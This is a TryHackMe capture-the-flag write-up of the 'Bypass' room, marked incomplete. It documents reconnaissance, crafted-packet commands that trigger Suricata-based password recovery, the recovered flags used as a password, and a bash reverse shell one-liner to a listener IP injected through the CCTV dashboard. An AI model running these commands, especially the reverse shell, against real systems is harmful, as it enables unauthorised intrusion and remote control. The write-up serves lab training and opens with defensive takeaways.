# Bypass

<!-- brain:report -->
- **Platform** TryHackMe
- **Difficulty** Medium
- **Source status** Documented

## Report overview

The observations in this case inform a review of service and share exposure and authorization and account recovery.

## Defensive takeaways

- Confirm the intended audience for network services and shares, then compare their permissions and reachability with that policy.
- Compare server-side authorization and account recovery with the documented access policy.

## Defensive references

- [Exposed service and share hardening](../../../defense/techniques/service-exposure-review.md)
- [Web authorization and account recovery](../../../defense/techniques/web-access-control.md)

<!-- /brain:report -->

---


**Platform:** TryHackMe  
**Difficulty:** Medium  
**Status:** Incomplete — packet-trigger password recovery and dashboard shell are documented; host privilege escalation/root still needs to be finished.

## Reconnaissance
```bash
silent-scan $TARGET
nmap -sVC -p22,80,443 $TARGET -oN service 
```
**Output**
```text
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b9:99:0c:cb:6f:84:14:55:e6:e8:0a:99:36:fe:1f:96 (RSA)
|   256 49:b5:98:02:f2:d1:1c:3d:08:31:19:e5:a1:9f:5b:44 (ECDSA)
|_  256 55:f2:b4:13:d0:fc:90:48:92:e1:fd:da:d5:71:3c:6e (ED25519)
80/tcp  open  http     Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: 403 Forbidden
443/tcp open  ssl/http Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: 403 Forbidden
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=cctv.thm/organizationName=cctv.thm/stateOrProvinceName=Tokyo/countryName=AU
| Not valid before: 2023-08-30T10:08:16
|_Not valid after:  2024-08-29T10:08:16
|_ssl-date: TLS randomness does not represent time
Service Info: Hosts: default, ip-10-128-144-102.eu-west-3.compute.internal; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


## Web Fuzzing
```bash
feroxbuster -u https://cctv.thm -w /usr/share/seclists/Discovery/Web-Content/big.txt -k
```

**Output**
```text
avascript/
301      GET        9l       28w      305c https://cctv.thm/mail => https://cctv.thm/mail/
200      GET       24l      287w     1772c https://cctv.thm/mail/dump.txt
301      GET        9l       28w      318c https://cctv.thm/javascript/jquery => https://cctv.thm/javascript/jquery/
```

## In the email.txt file 
```bash
From: steve@cctv.thm
To: mark@cctv.thm
Subject: Important Credentials

Hey Mark,

I have completed all the formalities for securing our CCTV web panel (cctv.thm:443). I have installed Suricata to automatically detect any invalid connection and enabled two-layer protection for the web panel. I will SMS you the passwords but incase if you misplace them, there is no possibility for recovery. 

We can recover the password only if we send some specially crafted packets 	
-	Make a UDP request to the machine with source port number 5000. Once done, you can fetch the flag through /fpassword.php?id=1
-	Make a TCP request to fpassword.php?id=2 with user-agent set as "I am Steve Friend". Once done, you can fetch the flag through /fpassword.php?id=2
-	Send a ping packet to the machine appearing as Mozilla browser (Hint: packet content with user agent set as Mozilla). Once done, you can fetch the flag through /fpassword.php?id=3
-	Attempt to login to the FTP server with content containing the word "user" in it. Once done, you can fetch the flag from /fpassword.php?id=4
-	Send TCP request to flagger.cgi endpoint with a host header containing more than 50 characters. Once done, you can fetch the flag from /fpassword.php?id=5

After receiving all the flags, you can visit the MACHINE IP that will ask you for the password. The first password will be concatenated values of all five flags you have received above.

For the second layer of security, I have enabled a wholly sandboxed login environment with no connection to the database and no possibility of command execution. The username is the computer's hostname, and the password is the same as the previous password. I will SMS you the details as well.


See ya soon

Steve
Dev Ops Engineer
```

## 1. Flag
Full technique: [Suricata trigger password recovery](../../../exploits/web-auth/suricata-trigger-password-recovery.md).

```bash
# Ncat to perform a udp request form source port 5000
echo "data" | ncat -p 5000 -u cctv.thm
```

---

## 2. Flag
```bash
curl -k -A "I am Steve Friend" https://cctv.thm/fpassword.php?id=2
```

---

## 3. Flag
```bash
sudo hping3 -1 -c 1 -d 32 -E /dev/stdin cctv.thm <<< "User-Agent: Mozilla"
```

---

## 4. Flag
```bash
curl -u "user:password" ftp://cctv.thm
```

---

## 5. Flag
```bash
curl -k -H "Host: $TARGET$(python3 -c 'print("a"*50)')" https://cctv.thm/flagger.cgi
```

## Login with flags
```bash
THM{10001}THM{10125}THM{13231}THM{33120}THM{12319}
```

## After Login: Edit the HTML Option Tag to Inject a Reverse Shell
Payload reference: [bash reverse shell](../../../payloads/reverse-shells/bash-tcp.md).

```bash
bash -c '/bin/bash -i >& /dev/tcp/192.168.130.5/8080 0>&1'
```

## grab release version
```bash
lsb_release -r -s
```
## Grab dashboard flag
```bash
cat dashboard.php
```
## Grab hostanme
```bash
hostname
```

## Current Stopping Point

The writeup currently recovers the password fragments, logs into the CCTV panel, and obtains dashboard-level command execution. It still needs the final host escalation path, root flag, and any reusable privilege-escalation extraction once that path is found.

## Related Notes

- [nmap](../../../tools/recon/nmap.md)
- [feroxbuster](../../../tools/fuzz/feroxbuster.md)
- [curl](../../../tools/web/curl.md)
- [ncat](../../../tools/network-services/ncat.md)
- [hping3](../../../tools/recon/hping3.md)
- [Suricata trigger password recovery](../../../exploits/web-auth/suricata-trigger-password-recovery.md)
- [bash reverse shell](../../../payloads/reverse-shells/bash-tcp.md)
